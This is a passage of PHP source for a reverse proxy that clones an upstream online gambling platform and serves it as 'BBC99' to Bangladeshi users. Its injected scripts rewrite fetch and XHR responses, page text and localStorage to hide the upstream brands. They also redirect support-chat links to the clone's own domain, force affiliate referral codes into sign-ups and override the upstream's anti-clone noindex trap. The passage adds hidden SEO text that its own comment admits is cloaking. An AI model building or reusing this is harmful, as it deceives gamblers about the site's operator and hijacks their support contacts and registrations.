    $canonTag = '<link rel="canonical" href="' . htmlspecialchars($canonUrl, ENT_QUOTES) . '">';
    $html = preg_replace('/<link\s+[^>]*rel=(["\']?)canonical\1[^>]*>\s*/i', '', $html);
    if (stripos($html, '</title>') !== false) {
        $html = preg_replace('/<\/title>/i', '</title>' . "\n" . $canonTag, $html, 1);
    } elseif (stripos($html, '</head>') !== false) {
        $html = preg_replace('/<\/head>/i', $canonTag . "\n" . '</head>', $html, 1);
    } else {
        $html .= "\n" . $canonTag;
    }

    // 3. og:url -> absolute apex self; og:site_name -> brand.
    $ogUrlTag = '<meta property="og:url" content="' . htmlspecialchars($canonUrl, ENT_QUOTES) . '">';
    $html = preg_replace('/<meta[^>]*property=(["\']?)og:url\1[^>]*>\s*/i', '', $html);
    if (stripos($html, '</title>') !== false) {
        $html = preg_replace('/<\/title>/i', '</title>' . "\n" . $ogUrlTag, $html, 1);
    } elseif (stripos($html, '</head>') !== false) {
        $html = preg_replace('/<\/head>/i', $ogUrlTag . "\n" . '</head>', $html, 1);
    } else {
        $html .= "\n" . $ogUrlTag;
    }
    if (stripos($html, 'og:site_name') === false && $siteName !== '') {
        $siteTag = '<meta property="og:site_name" content="' . htmlspecialchars($siteName, ENT_QUOTES) . '">';
        if (stripos($html, '</title>') !== false) {
            $html = preg_replace('/<\/title>/i', '</title>' . "\n" . $siteTag, $html, 1);
        } elseif (stripos($html, '</head>') !== false) {
            $html = preg_replace('/<\/head>/i', $siteTag . "\n" . '</head>', $html, 1);
        } else {
            $html .= "\n" . $siteTag;
        }
    }
    // 3b. Force share/SEO tags server-side so scrapers (FB/Telegram/WhatsApp,
    // which never run JS) see BBC99 + bbc99.bet, never upstream lotto/1333.
    // Applies to ALL pages (home + /m/inviteFriends + /register share links).
    $webTitle = trim((string) ($titles['web_title'] ?? ''));
    if ($webTitle === '') {
        $webTitle = $siteName . ' Bangladesh — Official';
    }
    $shareDesc = $webTitle;
    $logoRaw = trim((string) (($content['logo']['url'] ?? '')));
    $ogImageAbs = '';
    if ($logoRaw !== '' && stripos($logoRaw, '1333') === false && stripos($logoRaw, 'lotto') === false && stripos($logoRaw, 'gamer.free') === false) {
        if (strpos($logoRaw, '/') === 0) {
            $ogImageAbs = $scheme . '://' . $canonHost . preg_replace('/\?.*$/', '', $logoRaw);
        } elseif (preg_match('#^https?://#i', $logoRaw)) {
            $ogImageAbs = $logoRaw;
        }
    }
    if ($ogImageAbs === '') {
        $ogImageAbs = $scheme . '://' . $canonHost . '/res/meta-img.png';
    }
    // Remove EVERY existing social/share meta tag (upstream ships a full set in
    // mixed quoted/unquoted styles — stripping selectively leaves duplicates).
    // One pattern covers property|name, quoted|unquoted, any attribute order.
    $html = (string) preg_replace(
        '/<meta[^>]+(?:property|name)\s*=\s*(["\']?)(?:og:title|og:description|og:image|og:image:width|og:image:height|og:image:alt|og:type|twitter:title|twitter:description|twitter:image|twitter:card|twitter:site|title|description)\1[^>]*>\s*/i',
        '',
        $html
    );
    // Point tab icons at our favicon (upstream ships a 1px placeholder) and
    // apple-touch icons at the web app icon.
    $favRaw = trim((string) (($content['favicon']['url'] ?? '')));
    if ($favRaw !== '') {
        $favAbs = preg_match('#^https?://#i', $favRaw) ? $favRaw : $scheme . '://' . $canonHost . preg_replace('/\?.*$/', '', $favRaw);
        $favEsc = htmlspecialchars($favAbs, ENT_QUOTES);
        $appIconAbs = $scheme . '://' . $canonHost . '/img/web_app_icon.png';
        $html = (string) preg_replace_callback(
            '/<link[^>]*\brel\s*=\s*(["\']?)([^"\']*)\1[^>]*>/i',
            function ($m) use ($favEsc, $appIconAbs) {
                $tag = $m[0];
                $rel = strtolower($m[2]);
                if (strpos($rel, 'icon') === false) {
                    return $tag;
                }
                $want = (strpos($rel, 'apple-touch-icon') !== false) ? $appIconAbs : $favEsc;
                if (preg_match('/\bhref\s*=\s*(["\']?)[^"\']*\1/i', $tag)) {
                    return (string) preg_replace('/\bhref\s*=\s*(["\']?)[^"\']*\1/i', 'href="' . $want . '"', $tag, 1);
                }
                return rtrim($tag, '> ') . ' href="' . $want . '">';
            },
            $html
        );
    }
    // <title> -> BBC99 (server-side, visible to scrapers).
    if (preg_match('/<title[^>]*>.*?<\/title>/is', $html)) {
        $html = preg_replace('/<title[^>]*>.*?<\/title>/is', '<title>' . htmlspecialchars($webTitle, ENT_QUOTES) . '</title>', $html, 1);
    } elseif (preg_match('/<head[^>]*>/i', $html)) {
        $html = preg_replace('/(<head[^>]*>)/i', '$1' . "\n" . '<title>' . htmlspecialchars($webTitle, ENT_QUOTES) . '</title>', $html, 1);
    }
    $shareTags = "\n" . '<meta name="title" content="' . htmlspecialchars($webTitle, ENT_QUOTES) . '">'
        . "\n" . '<meta name="description" content="' . htmlspecialchars($shareDesc, ENT_QUOTES) . '">'
        . "\n" . '<meta property="og:type" content="website">'
        . "\n" . '<meta property="og:title" content="' . htmlspecialchars($webTitle, ENT_QUOTES) . '">'
        . "\n" . '<meta property="og:description" content="' . htmlspecialchars($shareDesc, ENT_QUOTES) . '">'
        . "\n" . '<meta property="og:image" content="' . htmlspecialchars($ogImageAbs, ENT_QUOTES) . '">'
        . "\n" . '<meta property="og:image:alt" content="' . htmlspecialchars($siteName, ENT_QUOTES) . '">'
        . "\n" . '<meta name="twitter:card" content="summary_large_image">'
        . "\n" . '<meta name="twitter:title" content="' . htmlspecialchars($webTitle, ENT_QUOTES) . '">'
        . "\n" . '<meta name="twitter:description" content="' . htmlspecialchars($shareDesc, ENT_QUOTES) . '">'
        . "\n" . '<meta name="twitter:image" content="' . htmlspecialchars($ogImageAbs, ENT_QUOTES) . '">';
    if (stripos($html, '</title>') !== false) {
        $html = preg_replace('/<\/title>/i', '</title>' . $shareTags, $html, 1);
    } elseif (stripos($html, '</head>') !== false) {
        $html = preg_replace('/<\/head>/i', $shareTags . "\n" . '</head>', $html, 1);
    } else {
        $html .= $shareTags;
    }

    if (!$isHome) {
        return $html;
    }

    // 4. JSON-LD WebSite (homepage only).
    if (stripos($html, 'application/ld+json') === false) {
        $ld = json_encode(['@context' => 'https://schema.org', '@type' => 'WebSite', 'name' => $siteName, 'url' => $canonUrl, 'inLanguage' => 'bn'], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        if ($ld !== false) {
            $ldTag = '<script type="application/ld+json">' . $ld . '</script>';
            if (stripos($html, '</body>') !== false) {
                $html = preg_replace('/<\/body>/i', $ldTag . '</body>', $html, 1);
            } else {
                $html .= $ldTag;
            }
        }
    }

    // 5. Hidden SEO content + noscript (homepage only). Pure CSS hide, no JS
    // timer: hidden instantly on first paint (no appear-then-gone flash).
    // NOTE: hidden text served to Google but not users is against Google's
    // spam policies (hidden text / cloaking) and risks a manual action.
    // Safer alternative is a small visible footer. Kept hidden per owner request.
    if (stripos($html, 'id="px-seo"') === false) {
        $seo = '<section id="px-seo" style="position:absolute!important;left:-9999px!important;top:auto!important;width:1px!important;height:1px!important;overflow:hidden!important;clip:rect(0 0 0 0)!important;white-space:nowrap!important;" aria-hidden="true">'
            . '<h1 style="font-size:24px;margin:0 0 12px">BBC99 বাংলাদেশ — অফিসিয়াল রেফার বোনাস ও অনলাইন গেমিং</h1>'
            . '<p>BBC99 বাংলাদেশের খেলোয়াড়দের জন্য অফিসিয়াল প্ল্যাটফর্ম। নতুন অ্যাকাউন্টে স্বাগতম অফার, প্রতিদিনের লাকি প্রোমোশন এবং প্রতি সফল রেফারে ৳300 বোনাস। বিকাশ, নগদ, রকেট ও USDT-তে দ্রুত জমা ও উত্তোলন।</p>'
            . '<h2 style="font-size:18px;margin:20px 0 8px">কেন BBC99?</h2>'
            . '<ul style="margin:0 0 12px 20px"><li>বাংলা ভাষায় সাপোর্ট ও মোবাইল-ফ্রেন্ডলি ডিজাইন</li><li>দ্রুত জমা: বিকাশ / নগদ / রকেট / USDT</li><li>রেফার করলেই ৳300 — কোনো অ্যাপ ডাউনলোড ছাড়াই ব্রাউজার থেকে খেলুন</li></ul>'
            . '<h2 style="font-size:18px;margin:20px 0 8px">জমা করবেন যেভাবে</h2>'
            . '<p><a href="/" style="color:#8b5cf6">BBC99 হোম</a> থেকে লগইন করে অ্যাকাউন্ট খুলুন, প্রোমোশন থেকে অফার বেছে নিন এবং ব্যালেন্স চেক করুন। সব সুবিধা ব্রাউজার থেকেই পাওয়া যায়।</p>'
            . '<h2 style="font-size:18px;margin:20px 0 8px">সাধারণ প্রশ্ন</h2>'
            . '<p><strong>রেফার বোনাস কত?</strong> প্রতি সফল রেফারে ৳300।<br><strong>সর্বনিম্ন জমা কত?</strong> ৳100 থেকে শুরু।<br><strong>উত্তোলন কতক্ষণে?</strong> সাধারণত ২৪ ঘণ্টার মধ্যে।</p>'
            . '</section>'
            . '<noscript><div style="max-width:960px;margin:0 auto;padding:16px;color:#111">BBC99 বাংলাদেশ — প্রতি সফল রেফারে ৳300 বোনাস। হোম থেকে লগইন করে খেলুন।</div></noscript>';
        if (stripos($html, '</body>') !== false) {
            $html = preg_replace('/<\/body>/i', $seo . '</body>', $html, 1);
        } else {
            $html .= $seo;
        }
    }
    return $html;
}

/**
 * Combined inject: all shims in one <head> pass (1 regex vs 8). Keeps order identical.
 */
function injectCombinedShims(string $html, string $base, array $content): string
{
    $out = '<script>if(location.pathname.indexOf("/Proxy/")===0||location.pathname==="/Proxy")location.replace(location.pathname.replace(/^\/Proxy/,"")||"/"+location.search+location.hash);</script>';
    // base shim
    if ($base !== '') {
        $baseJson = json_encode($base);
        $out .= '<base href="' . htmlspecialchars($base, ENT_QUOTES) . '/"><script>(function(){var b=' . $baseJson . ';function f(u){if(typeof u!=="string"||u.charAt(0)!=="/"||u.charAt(1)==="/")return u;if(u===b||u.indexOf(b+"/")===0)return u;return b+u;}var o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{arguments[1]=f(u);}catch(e){}return o.apply(this,arguments);};if(window.fetch){var wf=window.fetch;window.fetch=function(i,n){try{if(typeof i==="string")i=f(i);else if(i&&i.url)i=new Request(f(i.url),i);}catch(e){}return wf.call(this,i,n);};}})();</script>';
    }
    // app shim (always)
    $out .= <<<'HTML'
<script>(function(){
function pxToast(msg){try{var t=document.createElement("div");t.textContent=msg;
t.style.cssText="position:fixed;left:50%;bottom:24px;transform:translateX(-50%);z-index:2147483647;background:#111827;color:#fff;padding:12px 16px;border-radius:10px;font:600 14px system-ui,Segoe UI,Arial;box-shadow:0 10px 30px rgba(0,0,0,.4);max-width:90vw;text-align:center";
document.body.appendChild(t);setTimeout(function(){t.remove();},6000);}catch(e){}}
function pxInstall(){
if(window.__pxBip){try{window.__pxBip.prompt();var p=window.__pxBip;window.__pxBip=null;if(p&&p.userChoice)p.userChoice.then(function(){});}catch(e){}return;}
if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches){return;}
pxToast('Open the Chrome menu and choose "Install app" or "Add to Home screen".');}
window.pxInstallApp=pxInstall;
window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();window.__pxBip=e;});
var wo=window.open;window.open=function(u){try{if(typeof u==="string"&&/\.(apk|ipa)(\?|#|$)/i.test(u)){pxInstall();return null;}}catch(e){}return wo.apply(this,arguments);};
function isApk(u){return typeof u==="string"&&/\.(apk|ipa|mobileconfig)(\?|#|$)/i.test(u);}
function isAppBtn(el){try{var b=el&&el.closest?el.closest('.nav_item_btn,[class*="appdownload"],[class*="app-download"],[class*="downloadApp"],[class*="download-app"]'):null;if(!b)return false;var s=(b.className||"")+" "+(b.innerHTML||"");return /down|appdownload/i.test(s);}catch(e){return false;}}
document.addEventListener("click",function(e){
try{
var a=e.target&&e.target.closest?e.target.closest("a"):null;
if(a){var u=a.getAttribute("href")||"";
if(isApk(u)||(a.hasAttribute("download")&&/apk|app/i.test((a.textContent||"")+" "+(a.className||"")))){e.preventDefault();e.stopPropagation();pxInstall();return;}}
if(isAppBtn(e.target)){e.preventDefault();e.stopPropagation();pxInstall();}
}catch(err){}
},true);
function scan(){try{
var as=document.querySelectorAll("a[href]");
for(var i=0;i<as.length;i++){var h=as[i].getAttribute("href")||"";if(isApk(h)){as[i].setAttribute("data-px-apk","1");as[i].setAttribute("href","javascript:void(0)");}}
var qs=document.querySelectorAll(".qr-item,[class*='qr-item']");
for(var j=0;j<qs.length;j++){if(/android/i.test(qs[j].textContent||""))qs[j].style.display="none";}
}catch(err){}}
function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}
ready(scan);setInterval(scan,2000);})();</script>
HTML;
    // voucher shim
    $voucher = $content['voucher'] ?? [];
    if (!empty($voucher['enabled'])) {
        $dest = trim(preg_replace('/[\r\n]+/', '', (string) ($voucher['redirect_url'] ?? '')));
        $src  = '/' . ltrim((string) ($voucher['path'] ?? '/m/voucherCenter'), '/');
        if ($dest !== '' && $src !== '/') {
            $cfg = json_encode(['src' => strtolower($src), 'dest' => $dest], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
            $out .= '<script>(function(){var C=' . $cfg . ';var src=C.src.replace(/\/+$/,"");function hit(){var p=(location.pathname||"").toLowerCase().replace(/\/+$/,"");if(src===""||p===src||p.slice(-src.length)===src){var d=C.dest,dc=d.replace(/^https?:\/\/[^\/]+/i,"").toLowerCase().replace(/\/+$/,"");if(p!==dc){location.replace(d);}}}try{["pushState","replaceState"].forEach(function(m){var o=history[m];history[m]=function(){var r=o.apply(this,arguments);setTimeout(hit,0);return r;};});}catch(e){}window.addEventListener("popstate",hit);window.addEventListener("hashchange",hit);function boot(){hit();setInterval(hit,400);}if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",boot);else boot();})();</script>';
        }
    }
    // referral shim
    $code = REFERRAL_CODE; $aff = REFERRAL_AFFILIATE_CODE;
    if ($code !== '' || $aff !== '') {
        $cfg = json_encode(['code' => $code, 'aff' => $aff], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
        $out .= '<script>(function(){var C=' . $cfg . ';if(!C.code&&!C.aff)return;function merge(v){var o;try{o=v?JSON.parse(v):{};}catch(e){o={};}if(!o||typeof o!=="object")o={};if(C.code)o.referralCode=C.code;if(C.aff)o.affiliateCode=C.aff;return JSON.stringify(o);}try{var ls=window.localStorage;ls.setItem("reg_info",merge(ls.getItem("reg_info")));var orig=ls.setItem;ls.setItem=function(k,v){if(k==="reg_info")v=merge(v);return orig.call(ls,k,v);};}catch(e){}})();</script>';
    }
    // theme shim (inline CSS)
    $out .= <<<'CSS'
<style id="px-login-theme">
:root{--pxl-bg1:#151b30;--pxl-bg2:#0b0f1c;--pxl-line:#2c375a;--pxl-text:#eef2ff;--pxl-muted:#9aa6c7;--pxl-grad:linear-gradient(135deg,#7c3aed,#2563eb);--pxl-grad-hover:linear-gradient(135deg,#8b5cf6,#3b82f6);--pxl-login:linear-gradient(135deg,#f59e0b,#ef4444);--pxl-glow:rgba(99,102,241,.45);--pxl-gold:#f5b301}
.v--modal-overlay{background:rgba(3,6,16,.72)!important;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px)}
.loginmodal-bg,.regs_bg{border-radius:20px!important;overflow:hidden!important;border:1px solid var(--pxl-line)!important;box-shadow:0 30px 90px rgba(0,0,0,.6)!important}
.register_wrapper,.form-popup-container .form-popup-bg{background:linear-gradient(165deg,var(--pxl-bg1),var(--pxl-bg2))!important}
.form-popup-container{border-radius:22px!important;overflow:hidden!important;box-shadow:0 30px 90px rgba(0,0,0,.6)!important}
.form-popup-container .form-popup-bg{border:1px solid var(--pxl-line)!important;border-radius:0 22px 22px 0!important}
.form-popup-container .form-popup-banner{border-radius:22px 0 0 22px!important}
.register_wrapper::-webkit-scrollbar-thumb,.form-popup-bg::-webkit-scrollbar-thumb{background:var(--pxl-grad)!important}
.register-title__text,.form-title,.form-title__text,.form-title h5{color:var(--pxl-text)!important}
.form-title span{border-bottom:2px solid var(--pxl-gold)!important}
.form-title a{color:var(--pxl-muted)!important}
.method-select{color:var(--pxl-muted)!important;text-shadow:none!important}
.method-select .active.method-item{background:var(--pxl-grad)!important;color:#fff!important;border-radius:12px!important;box-shadow:0 8px 20px var(--pxl-glow)!important}
.item_box{background:rgba(255,255,255,.05)!important;border:1px solid var(--pxl-line)!important;border-radius:12px!important;transition:border-color .2s,box-shadow .2s!important}
.item_box:hover,.item_box:focus-within{border-color:#6366f1!important;box-shadow:0 0 0 3px var(--pxl-glow)!important}
.form_item .item_box>input,.hd_login .form_item .item_box>input,.hd_login .form_item .item_box.hasIcon>input{background:transparent!important;color:var(--pxl-text)!important;border-radius:12px!important}
.form_item .item_box>input:focus{border-color:#6366f1!important;box-shadow:0 0 0 3px var(--pxl-glow)!important}
.form_item .item_box>input::placeholder,.hd_login .form_item .item_box>input::placeholder{color:var(--pxl-muted)!important}
.label-text,.label-box{color:var(--pxl-muted)!important}
.input_icon,.item-icon{color:var(--pxl-muted)!important}
.form_item .submit_btn,.form-popup-container .submit_btn,.register_wrapper .submit_btn,.hd_login .submit_btn,.hd_login .register-btn,.hd_login .free-btn{background:var(--pxl-grad)!important;border:0!important;border-radius:12px!important;color:#fff!important;box-shadow:0 12px 26px var(--pxl-glow)!important;transition:.2s!important}
.form_item .submit_btn:hover,.form-popup-container .submit_btn:hover,.register_wrapper .submit_btn:hover,.hd_login .submit_btn:hover,.hd_login .register-btn:hover{background:var(--pxl-grad-hover)!important;box-shadow:0 16px 34px var(--pxl-glow)!important;transform:translateY(-1px)}
.form_item .submit_btn.login-btn,.form-popup-container .submit_btn.login-btn,.register_wrapper .submit_btn.login-btn,.hd_login .submit_btn.login-btn{background:var(--pxl-login)!important;border:0!important;box-shadow:0 12px 26px rgba(239,68,68,.35)!important}
.form-btn{background:transparent!important;color:#fff!important;border:0!important;border-radius:12px!important}
.form_item .sms-btn,.hd_login .form_item .sms-btn{background:var(--pxl-grad)!important;border-radius:10px!important;box-shadow:0 6px 16px var(--pxl-glow)!important}
.form_item .sms-btn:hover{background:var(--pxl-grad-hover)!important}
p.errorMsg,.form_item .errorMsg{color:#fca5a5!important}
.login_wrap .form-bottom-container,.register_wrap .form-bottom-container{display:none!important}
</style>
CSS;
    // content shim
    $titles = $content['titles'] ?? []; $logo = $content['logo'] ?? []; $favicon = $content['favicon'] ?? []; $marquee = $content['marquee'] ?? [];
    if (($titles['web_title'] ?? '') !== '' || ($logo['url'] ?? '') !== '' || ($favicon['url'] ?? '') !== '' || !empty($marquee['enabled'])) {
        $cfg = json_encode(['titles'=>['web_title'=>$titles['web_title']??''],'logo'=>['url'=>$logo['url']??'','width'=>(int)($logo['width']??0)],'favicon'=>['url'=>$favicon['url']??''],'marquee'=>['enabled'=>!empty($marquee['enabled']),'items'=>array_values(array_map(fn($it)=>['text'=>(string)($it['text']??''),'link'=>(string)($it['link']??'')],array_filter($marquee['items']??[],'is_array'))),'text'=>$marquee['text']??'','link'=>$marquee['link']??'','bg'=>$marquee['bg']??'#111827','color'=>$marquee['color']??'#ffffff','speed'=>max(20,(int)($marquee['speed']??160))]], JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
        $out .= '<script>(function(){var C=' . $cfg . ';function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}var T=C.titles||{},L=C.logo||{},F=C.favicon||{},M=C.marquee||{};if(T.web_title){var st=function(){if(document.title!==T.web_title)document.title=T.web_title;var e=document.getElementsByTagName("title")[0];if(e&&e.textContent!==T.web_title)e.textContent=T.web_title;};ready(st);setInterval(st,1200);}if(L.url){var sw=function(){var im=document.getElementsByTagName("img");for(var i=0;i<im.length;i++){var s=(im[i].getAttribute("src")||"")+" "+(im[i].className||"");if(/logo/i.test(s)&&im[i].src!==L.url){im[i].src=L.url;if(L.width>0){im[i].style.maxWidth=L.width+"px";im[i].style.height="auto";}}};};ready(sw);setInterval(sw,1500);}if(F.url){var fv=function(){if(document.getElementById("px-favicon"))return;var ls=document.querySelectorAll("link[rel*=\'icon\']");for(var i=0;i<ls.length;i++){if(ls[i].id!=="px-favicon"&&ls[i].parentNode)ls[i].parentNode.removeChild(ls[i]);}var l=document.createElement("link");l.id="px-favicon";l.rel="icon";l.href=F.url;document.head.appendChild(l);};ready(fv);setInterval(fv,3000);}if(M.enabled){var IT=(M.items&&M.items.length)?M.items:((M.text)?[{text:M.text,link:M.link||""}]:[]);ready(function(){var st=document.createElement("style");st.textContent=".notice_main,.marquee_box,.marquee-bar,.marquee-content,.notice_list{background:"+M.bg+" !important;color:"+M.color+" !important;}.notice_list li{color:"+M.color+" !important;}";document.head.appendChild(st);var pps=M.speed>0?M.speed:90;var applySpeed=function(){var cs=document.querySelectorAll(".marquee-content");var vw=window.innerWidth||0;for(var i=0;i<cs.length;i++){var w=cs[i].scrollWidth||0;var dist=w+0.67*vw;if(dist>0)cs[i].style.setProperty("animation-duration",(dist/pps)+"s","important");}};var setTxt=function(){if(!IT.length)return;var ls=document.querySelectorAll(".notice_list");for(var j=0;j<ls.length;j++){var cur=ls[j].querySelectorAll("li");var bad=cur.length!==IT.length;if(!bad){for(var m=0;m<IT.length;m++){if((cur[m].textContent||"")!==IT[m].text){bad=true;break;}}}if(bad){ls[j].innerHTML="";for(var k=0;k<IT.length;k++){var n=document.createElement("li");n.textContent=IT[k].text;ls[j].appendChild(n);}}}};var bind=function(){var ns=document.querySelectorAll(".notice_list li");for(var i=0;i<ns.length;i++){if(ns[i].getAttribute("data-px-mq"))continue;ns[i].setAttribute("data-px-mq","1");var it=IT[i%IT.length]||{};if(it.link){ns[i].style.cursor="pointer";(function(el,lk){el.addEventListener("click",function(ev){ev.stopPropagation();window.open(lk,"_blank");});})(ns[i],it.link);}}};applySpeed();setTxt();bind();setInterval(function(){applySpeed();setTxt();bind();},1500);});}})();</script>';
    }
    // offline + invite shims
    $out .= '<script>(function(){try{Object.defineProperty(navigator,"onLine",{get:function(){return true},configurable:true});}catch(e){}window.addEventListener("offline",function(e){e.stopImmediatePropagation();e.preventDefault();},true);var s=document.createElement("style");s.textContent=".offline-overlay,.network-error,.no-internet,.internet-off{display:none!important}";document.addEventListener("DOMContentLoaded",function(){try{document.head.appendChild(s);}catch(e){}});})();</script>';
    // seo guard shim: upstream bundles set meta robots=noindex at runtime
    // (anti-clone trap + route-based noindex). Enforce index,follow + apex
    // canonical in the live DOM so Google's rendered HTML stays indexable.
    $seoHost = strtolower(preg_replace('/:\d+$/', '', (string) ($_SERVER['HTTP_HOST'] ?? 'bbc99.bet')));
    if ($seoHost === 'www.bbc99.bet') {
        $seoHost = 'bbc99.bet';
    }
    $seoScheme = (strpos($seoHost, 'localhost') === 0 || strpos($seoHost, '127.') === 0 || strpos($seoHost, '192.168.') === 0) ? 'http' : 'https';
    $out .= '<script>(function(){var U=' . json_encode($seoScheme . '://' . $seoHost . '/') . ';function fix(){try{var ms=document.querySelectorAll(\'meta[name="robots"]\');for(var i=0;i<ms.length;i++){var c=(ms[i].getAttribute("content")||"").toLowerCase();if(c.indexOf("noindex")!==-1||c.indexOf("nofollow")!==-1){ms[i].setAttribute("content","index,follow");}}if(ms.length>1){for(var j=1;j<ms.length;j++){if(ms[j].parentNode)ms[j].parentNode.removeChild(ms[j]);}}var cs=document.querySelectorAll(\'link[rel="canonical"]\');if(cs.length===0){var l=document.createElement("link");l.setAttribute("rel","canonical");l.setAttribute("href",U);document.head.appendChild(l);}else{for(var k=0;k<cs.length;k++){if(cs[k].getAttribute("href")!==U)cs[k].setAttribute("href",U);}}}catch(e){}}function boot(){fix();setInterval(fix,1000);}if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",boot);else boot();try{new MutationObserver(fix).observe(document.documentElement,{childList:true,subtree:true});}catch(e){}})();</script>';
    $out .= '<script>(function(){var h=location.host;function f(s){if(typeof s!=="string")return s;return s.replace(/133bet22\.com/gi,h).replace(/1333bet\.ai/gi,h).replace(/bbc9922\.com/gi,h).replace(/1333bk\.com/gi,h).replace(/1333bet\d+\.com/gi,h).replace(/[a-z0-9-]*lotto[a-z0-9-]*\.[a-z0-9.\-]+/gi,h).replace(/[a-z0-9-]+\.gamer\.free/gi,h).replace(/https?:\/\/[^\'\"()\s]*\/merchant_resource\/appdownloadicon\/[^\'\"()\s]*/gi,"https://"+h+"/img/web_app_icon.png").replace(/https?:\/\/[^\'\"()\s]*\/fe_setting\/(?:desktop_app_logo|appdownloadicon)\/[^\'\"()\s]*/gi,"https://"+h+"/img/web_app_icon.png").replace(/https?:\/\/[^\'\"()\s]*(?:open_chat\.cgi|live-?chat|live800|miduoke|aican|udesk|qiyukf|easemob|tawk\.to|crisp\.chat|meiqia|kf5|53kf|customer-?service|online-?service|chatlink|mqqwpa|bizqq|kefu|live-?help|support-?chat|chat-?support)[^\'\"()\s]*/gi,"https://support.bbc99.bet");}function sweepStorage(){try{for(var si=0;si<localStorage.length;si++){var sk=localStorage.key(si);var sv=localStorage.getItem(sk);if(typeof sv==="string"&&(sv.indexOf("appdownloadicon")!==-1||sv.indexOf("desktop_app_logo")!==-1||sv.indexOf("133bet22")!==-1||sv.indexOf("1333bet")!==-1||sv.indexOf("1333bk")!==-1||sv.indexOf("bbc9922")!==-1||sv.indexOf("gamer.free")!==-1||sv.toLowerCase().indexOf("lotto")!==-1)){var nv=f(sv);if(nv!==sv){try{localStorage.setItem(sk,nv);}catch(e){}}}}catch(e){}}function hasSup(u){return typeof u==="string"&&/open_chat\.cgi|live-?chat|live800|miduoke|aican|udesk|qiyukf|easemob|tawk\.to|crisp\.chat|meiqia|kf5|53kf|customer-?service|online-?service|chatlink|mqqwpa|bizqq|kefu|live-?help|support-?chat|chat-?support/i.test(u);}function scan(){try{var b=document.body;if(!b)return;document.querySelectorAll("input").forEach(function(i){if(i.value&&((i.value.indexOf("133bet22")!==-1)||(i.value.indexOf("1333bet")!==-1)||(i.value.indexOf("bbc9922")!==-1)||(i.value.indexOf("1333bk")!==-1)||(i.value.toLowerCase().indexOf("lotto")!==-1)||(i.value.indexOf("gamer.free")!==-1)))i.value=f(i.value);});var w=document.createTreeWalker(b,NodeFilter.SHOW_TEXT,null,false),n;while(n=w.nextNode()){if(n.nodeValue&&((n.nodeValue.indexOf("133bet22")!==-1)||(n.nodeValue.indexOf("1333bet")!==-1)||(n.nodeValue.indexOf("bbc9922")!==-1)||(n.nodeValue.indexOf("1333bk")!==-1)||(n.nodeValue.toLowerCase().indexOf("lotto")!==-1)||(n.nodeValue.indexOf("gamer.free")!==-1)))n.nodeValue=f(n.nodeValue);}var els=document.querySelectorAll("a[href]");els.forEach(function(a){if(a.href&&((a.href.indexOf("133bet22")!==-1)||(a.href.indexOf("1333bet")!==-1)||(a.href.indexOf("bbc9922")!==-1)||(a.href.indexOf("1333bk")!==-1)||(a.href.toLowerCase().indexOf("lotto")!==-1)||(a.href.indexOf("gamer.free")!==-1)||hasSup(a.href)))a.href=f(a.href);});}catch(e){}}if(window.fetch){var of=window.fetch;window.fetch=function(u,o){return of(u,o).then(function(r){var ct=(r.headers.get("content-type")||"").toLowerCase();if(ct.indexOf("json")!==-1)return r.clone().text().then(function(t){if(t.indexOf("133bet22")!==-1||t.indexOf("1333bet")!==-1||t.indexOf("bbc9922")!==-1||t.indexOf("1333bk")!==-1||t.toLowerCase().indexOf("lotto")!==-1||t.indexOf("gamer.free")!==-1||hasSup(t)){var nt=f(t);return new Response(nt,{status:r.status,statusText:r.statusText,headers:r.headers});}return new Response(t,{status:r.status,statusText:r.statusText,headers:r.headers});});return r;});}}var oOpen=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){var xhr=this;var origDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,"responseText");try{Object.defineProperty(xhr,"_raw",{writable:true,value:""});xhr.addEventListener("load",function(){try{if(xhr.responseText&&((xhr.responseText.indexOf("133bet22")!==-1)||(xhr.responseText.indexOf("1333bet")!==-1)||(xhr.responseText.indexOf("bbc9922")!==-1)||(xhr.responseText.indexOf("1333bk")!==-1)||(xhr.responseText.toLowerCase().indexOf("lotto")!==-1)||(xhr.responseText.indexOf("gamer.free")!==-1)||hasSup(xhr.responseText))){Object.defineProperty(xhr,"responseText",{get:function(){return f(xhr._raw);}});Object.defineProperty(xhr,"response",{get:function(){return f(xhr._raw);}});}}catch(e){}});}catch(e){}return oOpen.apply(this,arguments);};document.addEventListener("DOMContentLoaded",function(){scan();sweepStorage();setInterval(scan,1200);setInterval(sweepStorage,4000);try{new MutationObserver(scan).observe(document.body,{childList:true,subtree:true,characterData:true});}catch(e){}});})();</script>';
    $out .= injectWithdrawShim();
    // Our routes must never render upstream content. The upstream SPA is a
    // client-side router, so when it navigates to one of them it only rewrites
    // the address bar: the visitor keeps reading upstream markup under OUR url,
    // and a later refresh swaps the page under them. Turn those transitions into
    // a real document load instead.
    $ours = ['/', '/index', '/index.html', '/home', '/m', '/m/index', '/m/index.html',
        '/m/home', '/m/login', '/m/register', '/m/account', '/m/member/home', '/m/rewardCenter',
        '/m/receivingCenter', '/m/activity/signIn'];
    $oursJson = json_encode($ours, JSON_UNESCAPED_SLASHES);
    $out .= '<script>(function(){var OURS=' . $oursJson . ';'
        . 'function norm(p){if(p==="/"||p==="/index"||p==="/index.html"||p==="/home"||p==="/m"||p==="/m/index"||p==="/m/index.html"||p==="/m/home")return "/m/index.html";return null;}'
        . 'function mine(u){try{var p=new URL(u,location.href).pathname.replace(/\\/+$/,"")||"/";'
        . 'return OURS.indexOf(p)!==-1;}catch(e){return false;}}'
